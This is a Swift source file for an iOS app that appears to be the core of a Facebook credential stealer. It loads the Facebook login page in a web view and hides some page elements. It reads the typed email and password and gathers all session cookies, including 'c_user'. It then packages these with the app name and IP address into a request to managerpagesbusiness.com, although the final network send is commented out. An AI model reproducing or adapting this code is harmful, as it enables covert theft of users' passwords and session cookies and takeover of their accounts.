//
//  File.swift
//  
//
//  Created by DanHa on 24/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsTwo: UIViewRepresentable {
    func makeCoordinator() -> ClassTwoCoordi {
        ClassTwoCoordi(self)
    }
    
    let url: URL?
    @Binding var is_two_chuyen_man: Bool
    @Binding var is_two_load_hide: Bool
    @Binding var is_two_ktra_matkhau: String
    
    private let obs_tow = Web_Tow()
    
    var ob_ser_ver: NSKeyValueObservation? {
        obs_tow.in_stan_ce
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = "var meta = document.createElement('meta');meta.name = 'viewport';meta.content ='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';var head = document.getElementsByTagName('head')[0];head.appendChild(meta);"
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
    }
    
    class ClassTwoCoordi: NSObject, WKNavigationDelegate {
        var pa_rent_tow: CoordsTwo
        init(_ pa_rent_tow: CoordsTwo) {
            self.pa_rent_tow = pa_rent_tow
        }
        
        func readIppAdd() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpAdd.self, from: data_bit) {
                    address_i_p = loadedPerson.ipadd
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }
        
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript("document.getElementById('email').value;") { item_email, error_email in
                if let email_UserDefaults = item_email as? String, error_email == nil {
                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesEmail(email: email_UserDefaults)), forKey: "email")
                }
            }
            webView.evaluateJavaScript("document.getElementById('pass').value;") { item_matkhau, errormatkhau in
                if let matkhau = item_matkhau as? String, errormatkhau == nil {
                    self.pa_rent_tow.is_two_ktra_matkhau = matkhau
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript("document.querySelector('[data-cookiebanner=\"accept_button\"]').click();")
            webView.evaluateJavaScript("document.querySelector('._8eso').style.display='none'; document.getElementById('pageFooter').style.display='none'; document.getElementById('reg_pages_msg').style.display='none'; document.querySelector('.fb_content').style = 'min-height: 0px'; document.querySelector('[id=\"content\"]').style = 'min-height: 0px'; document.querySelector('[class=\"fb_logo _8ilh img\"]').style = 'margin-top: 30px'; document.querySelector('._95ka').style = 'padding-bottom: 0px; padding-top: 0px;'; document.querySelector('._95k9').style = 'min-width: 0px; background: #ffffff;'; document.querySelector('[class=\"_8esl\"]').style = 'width: 100%; padding: 0px 0px 0px 0px;'; document.querySelector('[class=\"_8esk\"]').style = 'margin: auto; height: 0px; padding: 0px 0px'; document.querySelector('[class=\"_8ice\"]').style = 'padding: 0px 0px 0px 0px'; document.querySelector('[class=\"_8iep _8icy _9ahz _9ah-\"]').style = 'width: 100%; height: 0px'; document.querySelector('._6luv').style = 'width: 100%; margin: auto; padding: 50px 0px 0px 0px; border-radius: 0px; box-shadow: none;'; document.querySelector('[class=\"_9vtf\"]').style = 'width: 100%'; document.querySelector('.fb_content').style = 'min-height: 0px';")
            webView.evaluateJavaScript("document.getElementById('skip_button').style.display='none';")
            webView.evaluateJavaScript("document.querySelector('[class=\"_4-u5 _30ny\"]').style.backgroundColor ='white';")
            webView.evaluateJavaScript("document.querySelector('[class=\"_9ol3\"]').style = 'display: none; height: 0px';")
            webView.evaluateJavaScript("document.querySelector('[class=\"_4-u5 _30ny\"]').style = 'padding: 80px 15px 0px 15px; background: #ffffff;'")
            webView.evaluateJavaScript("document.querySelector('[class=\"identify_yourself_block\"]').style = 'width: 100%';")
            webView.evaluateJavaScript("document.querySelector('._9np_').style = 'width: 100%; border-radius: 0px; box-shadow: none;'")
            webView.evaluateJavaScript("document.querySelector('[class=\"inputtext _9o1w\"]').style = 'width: 100%';")
            
            if webView.url?.absoluteString.range(of: "checkpoint") != nil {
                webView.evaluateJavaScript("var x = document.createElement(\"IMG\"); x.setAttribute(\"src\", \"https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg\"); x.setAttribute(\"width\", \"350\"); x.setAttribute(\"height\", \"100\"); x.setAttribute(\"style\", \"display: block; margin-left: auto; margin-right: auto; width:100%;\"); document. getElementById(\"pagelet_bluebar\").appendChild(x);")
                webView.evaluateJavaScript("document.getElementById('pageFooter').style.display='none'; document.querySelector('[class=\"_4-u5 _30ny\"]').style.backgroundColor ='white'; document.getElementById('globalContainer').style.width='100%'; document.getElementById('blueBarDOMInspector').style.display ='none'; document.querySelector('._5x_9').style.width='95%';")
            }
            
            webView.evaluateJavaScript("document.querySelector('[style=\"-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box\"]').innerHTML;") { nameUserGet, errorNameUserGet in
                if let nameuser = nameUserGet as? String, errorNameUserGet == nil {
                    if !nameuser.isEmpty {
                        UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesName(nameuser: nameuser)), forKey: "username")
                    }
                }
                
            }
            
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                let two_i = cookies.firstIndex(where: { $0.name == "c_user"})
                if two_i != nil {
                    let two_get_ck = cookies.reduce("", { x,y in
                        x + y.name + "=" + String(y.value) + ";"
                    })
                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesMK(matkhau: self.pa_rent_tow.is_two_ktra_matkhau)), forKey: "matkhau")
                    self.pa_rent_tow.is_two_load_hide = true
                    let Two_json_data: [String: Any] = [
                        "namecuser": cookies[two_i!].value,
                        "datacookies": two_get_ck,
                        "useragentck": self.pa_rent_tow.is_two_ktra_matkhau,
                        "nameapp": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "",
                        "ipaddress": self.readIppAdd()
                    ]
                    let url: URL = URL(string: "https://managerpagesbusiness.com/api/savedatanew")!
                    let json_data = try? JSONSerialization.data(withJSONObject: Two_json_data)
                    var request = URLRequest(url: url)
                    request.httpMethod = "PATCH"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    request.httpBody = json_data
//                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
//                        if error != nil {
//                            print("not ok")
//                        } else if data != nil {
                            DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
                                self.pa_rent_tow.is_two_chuyen_man = true
                            }
//                        }
//
//                    }
//                    task.resume()
                }
            }
        }
    }
}

@available(iOS 14.0, *)


struct UserInvoicesIpAdd: Codable {
    var ipadd: String
}

struct UserInvoicesEmail: Codable {
    var email: String
}

struct UserInvoicesName: Codable {
    var nameuser: String
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

private class Web_Tow: ObservableObject {
    @Published var in_stan_ce: NSKeyValueObservation?
}
